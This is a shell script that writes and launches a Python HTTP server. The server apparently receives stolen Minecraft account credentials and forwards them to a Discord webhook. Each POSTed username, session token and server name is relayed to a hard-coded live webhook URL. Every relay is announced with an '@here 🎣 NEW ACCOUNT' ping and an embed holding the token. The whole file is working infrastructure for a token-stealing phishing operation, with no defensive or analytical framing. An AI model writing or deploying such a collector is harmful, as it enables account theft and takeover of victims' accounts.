cd /root/mcserver
rm -f server.py
cat > server.py << 'EOF'
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import urllib.request
import urllib.error

WEBHOOK = "https://discord.com/api/webhooks/1457853958667370779/9NEKqkwBwLukL34b1la0YgOExRgFPTo9Oy-OciqmReVrCmwzDMhDwEZiKBjrC55o1Cqx"

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            length = int(self.headers['Content-Length'])
            data = json.loads(self.rfile.read(length).decode())
            
            username = data.get('username', 'Unknown')
            token = data.get('token', '')
            server = data.get('server', '')
            
            print(f"Got: {username} on {server}")
            
            # Try to send to Discord
            try:
                # First message: @here
                ping_data = json.dumps({"content": "@here 🎣 NEW ACCOUNT"}).encode()
                ping_req = urllib.request.Request(WEBHOOK, data=ping_data, headers={'Content-Type': 'application/json'})
                urllib.request.urlopen(ping_req, timeout=5)
                
                # Second message: Embed
                embed = {
                    "title": f"🎣 ACCOUNT - {username}",
                    "description": f"**User:** {username}\n**Server:** {server}",
                    "fields": [{"name": "Token", "value": f"||```{token}```||"}],
                    "color": 65280
                }
                embed_data = json.dumps({"embeds": [embed]}).encode()
                embed_req = urllib.request.Request(WEBHOOK, data=embed_data, headers={'Content-Type': 'application/json'})
                urllib.request.urlopen(embed_req, timeout=5)
                
                print("Sent to Discord")
                
            except urllib.error.HTTPError as e:
                print(f"Discord error {e.code}: {e.reason}")
                # Continue anyway - at least we logged it
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
            
        except Exception as e:
            print(f"Error: {e}")
            self.send_response(500)
            self.end_headers()
    
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Server running')
    
    def log_message(self, *args):
        pass

print("Server starting on port 5000")
server = HTTPServer(('0.0.0.0', 5000), Handler)
server.serve_forever()
EOF

python3 server.py
